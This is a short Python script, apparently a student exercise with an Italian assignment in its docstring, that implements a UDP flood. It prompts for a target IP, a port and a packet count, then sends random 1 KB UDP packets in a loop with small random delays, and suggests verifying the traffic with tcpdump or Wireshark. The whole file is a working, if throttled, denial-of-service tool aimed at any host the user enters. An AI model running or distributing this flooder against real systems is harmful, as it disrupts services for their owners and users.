''' scrivere un programma in Python che simuli un UDP flood.
1.Il programma deve richiedere IP target (input)
2.Il programma deve richiedere porta target (input)
3.La grandezza dei pacchetti da inviare è di 1 KB per pacchetto 
4.Il programma deve chiedere quanti pacchetti da 1 KB inviare (input)

5.Implementazione meccanismo di ritardo casuale tra 0 e 0.1 secondi

Verifica funzionamento: <sudo tcpdump -i any port (num.porta)> da zsh o Wireshark'''

#https://docs.python.org/3/library/random.html
#https://docs.python.org/3/library/time.html#:~:text=time.sleep,is%20now%20used.
#https://docs.python.org/3/library/random.html#:~:text=random.uniform(a%2C%20b)

import socket as so
from random import randbytes, uniform
import time

s = so.socket(so.AF_INET,so.SOCK_DGRAM)
bytes = randbytes(1024)

def attacco():

    ip = input("\nInserisci indirizzo IP: \n")
    porta = int(input("\nInserisci porta: \n"))
    pacchetti = int(input("\nQuanti pacchetti vuoi inviare?\n"))
    addr = (ip,porta)

    for i in range(pacchetti):
        s.sendto(bytes,addr)
        #ritardo casuale tra 0 e 0.1 secs
        time.sleep(uniform(0, 0.1))
    print("UDP inviati!")

    s.close()

if __name__ == "__main__":
    attacco()